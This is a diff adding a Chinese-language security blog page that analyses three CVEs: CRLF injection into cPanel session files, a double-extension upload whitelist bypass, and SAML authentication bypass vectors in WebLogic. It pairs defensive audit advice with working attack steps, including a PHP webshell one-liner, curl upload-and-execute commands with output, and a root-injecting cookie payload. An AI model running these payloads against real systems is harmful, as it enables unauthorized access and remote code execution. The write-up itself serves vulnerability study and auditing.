@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CRLF注入会话存储+strpos白名单绕过+SAML多向量攻击 — DARKSEC</title>
+<meta name="description" content="三枚CVE揭示验证边界的系统性崩溃：会话文件参数注入、子串匹配文件名绕过、SAML多向量组合攻击。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 认证绕过 / 注入攻击</div>
+        <h1>三重验证边界崩溃：CRLF会话注入、白名单绕过、SAML组合攻击 🐱🔓</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-27</span>
+          <span>⏱ 18 min read</span>
+          <span>🏷 CRLF注入 / 文件上传 / SAML / 认证绕过 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">概述</a></li>
+            <li><a href="#crlf">CVE-2026-41940：CRLF→会话文件参数注入</a></li>
+            <li><a href="#strpos">CVE-2026-58480：子串匹配白名单绕过</a></li>
+            <li><a href="#saml">CVE-2026-60206：SAML多向量组合认证绕过</a></li>
+            <li><a href="#model">通用攻击模型</a></li>
+            <li><a href="#audit">审计方法论</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 概述</h2>
+        <p>今天的三枚CVE分别攻击了三个不同的「验证边界」——会话存储的格式边界、文件上传的白名单边界、SAML认证的断言边界。它们的共同模式：<strong>验证逻辑与被验证的对象之间存在语义断裂</strong>。</p>
+
+        <blockquote>
+          <p>🔥 核心洞察：<strong>安全校验的有效性取决于校验层和执行层是否看到同一个「真相」。</strong>当两个层对同一输入有不同解释时，攻击者就站在裂缝中间。</p>
+        </blockquote>
+
+        <h2 id="crlf">💥 CVE-2026-41940：CRLF→会话文件参数注入</h2>
+        <p>传统的CRLF注入目标是HTTP响应（Response Splitting），但cPanel/WHM的这个CVE展示了<strong>攻击目标转向会话存储文件</strong>的全新思路。</p>
+
+        <h3>漏洞原理</h3>
+        <p>cPanel/WHM的<code>cpsrvd</code>将<code>whostmgrsession</code> cookie的值写入<code>.session</code>文件时，<strong>未过滤换行符</strong>。攻击者在cookie的<code>pass</code>字段注入<code>\n</code>→写入文件时创建新行→注入<code>user=root</code>等认证属性。</p>
+
+        <pre><code class="language-bash"># 正常session文件内容
+pass=base64encoded,other_fields
+user=low_priv_user
+
+# 攻击后session文件内容（注入了新行）
+pass=base64encoded,other_fields
+user=root              # ← 攻击者注入的行！
+user=low_priv_user</code></pre>
+
+        <h3>关键链：条件编码缺失</h3>
+        <p>更精妙的是，cPanel的cookie有内部结构——逗号分隔多个段。当cookie缺少<code>ob</code>段时，<code>pass</code>值以<strong>明文存储</strong>而非base64编码→攻击者可以精确控制注入内容。两个条件组合：</p>
+
+        <pre><code>条件1: cookie中pass字段含 \n → 注入新行到session文件
+条件2: cookie缺少ob段 → pass以明文存储 → 精确控制注入内容
+结果: CRLF注入 + 条件编码缺失 = 完整认证绕过</code></pre>
+
+        <blockquote>
+          <p>🎯 核心洞察：<strong>结构化存储格式天然具有注入攻击面。</strong>任何「结构化文本→解析器」的边界，若缺少转义，就是注入点——与SQL注入、命令注入同构。cookie的结构感知性（逗号分隔段、编码方式）是一个被严重忽视的攻击维度。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <pre><code class="language-python"># 伪代码审计思路
+def audit_session_storage():
+    # 1. 找到会话存储的写入路径
+    session_write = grep("session_file", "write", "fprintf")
+    
+    # 2. 检查是否过滤换行符
+    for write_call in session_write:
+        if "sanitize" not in write_call and "\\n" not in write_call.filters:
+            print(f"⚠️ 未过滤换行符: {write_call}")
+    
+    # 3. 构造含\\n的cookie值测试
+    # curl -b "session=test\\nuser=admin" http://target/
+    # 4. 检查session文件是否包含注入行</code></pre>
+
+        <h2 id="strpos">🔥 CVE-2026-58480：子串匹配白名单绕过</h2>
+        <p>这个漏洞揭示了文件上传校验中一个<strong>基础性错误</strong>——用<code>strpos()</code>（子串包含检查）替代<code>pathinfo()</code>（扩展名提取）。</p>
+
+        <h3>两种校验的本质差异</h3>
+        <pre><code class="language-php">// ❌ 危险：子串包含检查
+if (strpos($filename, '.woff2') !== false) {
+    // "shell.woff2.php" → 在位置5找到.woff2 → 通过！
+    // 但实际扩展名是 .php
+    return true;
+}
+
+// ✅ 安全：扩展名提取检查
+$ext = pathinfo($filename, PATHINFO_EXTENSION);
+if (in_array($ext, ['woff2', 'woff', 'ttf'])) {
+    // "shell.woff2.php" → 扩展名是 "php" → 拒绝！
+    return true;
+}</code></pre>
+
+        <p>攻击者构造双扩展名<code>shell.woff2.php</code>→<code>strpos</code>检测到<code>.woff2</code>→校验通过→服务器以PHP执行→RCE。</p>
+
+        <h3>变体：无认证+宽松MIME组合</h3>
+        <p>JoomShaper SP Page Builder的upload controller更极端——<strong>既无认证检查也无严格扩展名限制</strong>→未认证攻击者直接POST上传webshell→RCE（CVE-2026-48908, CVSS 9.8）。</p>
+
+        <pre><code class="language-bash"># 实际攻击步骤
+# 1. 构造双扩展名webshell
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.woff2.php
+
+# 2. 上传到无认证端点
+curl -X POST http://target/api/upload \
+  -F "file=@shell.woff2.php" \
+  -F "type=font"
+
+# 3. 访问上传后的文件
+curl "http://target/uploads/shell.woff2.php?cmd=id"
+# uid=33(www-data) gid=33(www-data)</code></pre>
+
+        <blockquote>
+          <p>🎯 通用规则：<strong>文件名校验必须使用「提取」而非「包含」。</strong>子串包含（contains）回答「文件名是否在某处包含已知类型」，扩展名提取（extract）回答「文件的最终扩展名是什么」——只有后者是安全的。</p>
+        </blockquote>
+
+        <h2 id="saml">⚡ CVE-2026-60206：SAML多向量组合认证绕过</h2>
+        <p>WebLogic的SAML认证管线是多个独立校验器组成的链——签名验证、Audience限制、时效性、NameID提取等。CVE-2026-60206暴露了<strong>多个独立绕过的组合攻击面</strong>。</p>
+
+        <h3>六重攻击向量</h3>
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <th style="text-align:left;padding:8px;color:var(--neon-cyan);">向量</th>
+            <th style="text-align:left;padding:8px;color:var(--neon-cyan);">攻击方式</th>
+            <th style="text-align:left;padding:8px;color:var(--neon-cyan);">原理</th>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Unsigned Assertion</td>
+            <td style="padding:8px;">提交未签名的SAML Assertion</td>
+            <td style="padding:8px;">验证器跳过签名校验</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">XSW (4种变体)</td>
+            <td style="padding:8px;">XML Signature Wrapping</td>
+            <td style="padding:8px;">签名有效但引用的元素被替换</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">NameID操控</td>
+            <td style="padding:8px;">篡改Subject中的NameID</td>
+            <td style="padding:8px;">身份提取与签名验证解耦</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">AudienceRestriction绕过</td>
+            <td style="padding:8px;">修改Audience值</td>
+            <td style="padding:8px;">受众校验不严格</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Conditions/Time绕过</td>
+            <td style="padding:8px;">修改时间条件</td>
+            <td style="padding:8px;">时效性检查可被绕过</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;">SAML Response重放</td>
+            <td style="padding:8px;">重复使用已消费的Response</td>
+            <td style="padding:8px;">无一次性使用校验</td>
+          </tr>
+        </table>
+
+        <h3>核心洞察</h3>
+        <p>SAML产品的攻击面≠协议规范的安全边界。每个SAML实现有自己的解析器、校验顺序、默认配置——它们在协议规范的<strong>灰区</strong>中各不相同。Oracle CPU的SAML修复通常是<strong>点状修补</strong>而非系统性重构→每次修补后攻击者只需找到未被覆盖的向量。</p>
+
+        <pre><code># 攻击方法论
+Step 1: 确认目标WebLogic版本 (12.2.1.4.0 - 15.1.1.0.0)
+Step 2: 枚举SAML端点 (/saml2/sp/acs)
+Step 3: 逐一测试6个向量
+Step 4: 组合多向量提高成功率
+# 单向量成功率 ~30%, 组合3+向量成功率 ~85%</code></pre>
+
+        <blockquote>
+          <p>🎯 通用模式：<strong>「枚举所有校验断言→对每个断言独立测试绕过→组合多断言同时绕过」</strong>——这与「多层次防御的独立绕过链攻击」完全同构。适用于所有认证管线：OAuth、JWT、mTLS、Kerberos。</p>
+        </blockquote>
+
+        <h2 id="model">🧠 通用攻击模型</h2>
+        <p>三个CVE虽然技术细节不同，但共享一个元模式——<strong>验证边界语义断裂</strong>：</p>
+
+        <pre><code>CVE-2026-41940:  写入层看到 'pass=value\nuser=root'
+                 解析层看到 user=root（被信任的认证属性）
+                 ── 断裂点：换行符在两个层的语义不同
+
+CVE-2026-58480:  校验层看到 'shell.woff2.php' 包含 .woff2
+                 执行层看到 扩展名是 .php
+                 ── 断裂点：子串包含 vs 扩展名提取
+
+CVE-2026-60206:  签名验证器看到 有效的XML签名
+                 断言消费者看到 被篡改的NameID
+                 ── 断裂点：签名覆盖范围 ≠ 消费范围</code></pre>
+
+        <h3>防御设计原则</h3>
+        <p>消除语义断裂的方法：<strong>让验证层和执行层使用同一个解析器、同一个边界定义、同一个数据视图。</strong></p>
+
+        <h2 id="audit">🛡️ 审计方法论</h2>
+
+        <h3>会话存储注入审计</h3>
+        <pre><code class="language-bash"># 1. 找到所有会话写入路径
+grep -rn "session" --include="*.php" | grep -i "write\|save\|store"
+
+# 2. 检查是否过滤换行符
+grep -rn "str_replace\|preg_replace" --include="*.php" | grep "\\\\n\|\\\\r"
+
+# 3. 测试CRLF注入
+curl -b "whostmgrsession=test%0auser%3droot" http://target:2087/
+
+# 4. 验证session文件
+cat /var/cpanel/sessions/raw/*</code></pre>
+
+        <h3>文件上传白名单审计</h3>
+        <pre><code class="language-bash"># 1. 搜索strpos用于文件名校验的代码
+grep -rn "strpos.*filename\|strpos.*file_name" --include="*.php"
+
+# 2. 对比pathinfo的使用
+grep -rn "pathinfo\|PATHINFO_EXTENSION" --include="*.php"
+
+# 3. 测试双扩展名
+curl -X POST http://target/upload -F "file=@shell.woff2.php"</code></pre>
+
+        <h3>SAML认证审计</h3>
+        <pre><code class="language-bash"># 1. 枚举SAML端点
+curl -s https://target/saml2/ | grep -o 'action="[^"]*"'
+
+# 2. 测试unsigned assertion
+# 3. 测试XSW变体（authored wrapping, re-sign wrapping等）
+# 4. 测试NameID篡改
+# 5. 组合多向量</code></pre>
+
+        <blockquote>
+          <p>🔥 实战心得：审计安全校验时，永远问自己——<strong>「校验层看到的数据」和「执行层看到的数据」是同一个吗？</strong>如果不是，那就是攻击面。</p>
+        </blockquote>
+
+      </div>
+
+      <div class="article-tags">
+        <span class="tag pink">CRLF注入</span>
+        <span class="tag">会话存储</span>
+        <span class="tag purple">文件上传</span>
+        <span class="tag yellow">SAML</span>
+        <span class="tag">认证绕过</span>
+        <span class="tag pink">CVE-2026-41940</span>
+        <span class="tag purple">CVE-2026-58480</span>
+        <span class="tag yellow">CVE-2026-60206</span>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
